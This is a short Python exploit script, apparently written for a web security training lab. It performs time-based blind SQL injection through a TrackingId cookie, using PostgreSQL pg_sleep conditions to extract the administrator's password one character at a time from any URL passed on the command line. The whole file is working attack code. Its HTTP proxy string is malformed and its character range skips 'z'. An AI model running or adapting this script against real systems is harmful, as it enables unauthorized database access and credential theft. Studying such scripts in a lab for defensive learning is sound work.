import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http:127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(48,122):
            sql_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(5) else pg_sleep(-1) end from users)--" %(i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId':'YsbMctlpBi2wpfhq' + sql_payload_encoded, 'session':'sJrdBGVKCx4tHt0sFIiswEqA8FOtTBwY'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) > 4:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retriving administrator password....")
    sqli_password(url)

if __name__ == "__main__":
    main()